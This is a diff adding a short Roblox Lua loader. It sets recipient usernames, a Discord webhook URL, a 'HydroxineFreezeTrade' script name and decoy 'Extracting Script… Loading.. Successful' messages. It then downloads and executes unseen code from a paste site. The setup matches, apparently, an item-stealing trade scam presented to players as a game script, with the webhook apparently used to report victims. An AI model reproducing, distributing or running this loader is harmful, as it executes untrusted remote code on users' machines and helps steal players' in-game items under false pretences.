@@ -1,0 +1,9 @@
+UserName = "gwapoko12131"
+UserName2 = "UpdatedScriptLink"
+Webhook = "https://discord.com/api/webhooks/1110929594204295218/IApU12QTj9FIFuLofWCAyoCnYsmaDHl5xy8L0g_Qt5pyR6-93-zVKWYOCI8aXseRZ3rG"
+_G.ScriptName = "HydroxineFreezeTrade"
+_G.FirstText = "Extracting Script"
+_G.SecondText = "Loading.."
+_G.ThirdText = "Successful"
+_G.WaitingTime = 300
+loadstring(game:HttpGet("https://pastes.io/raw/xpkcssuwqq", true))()
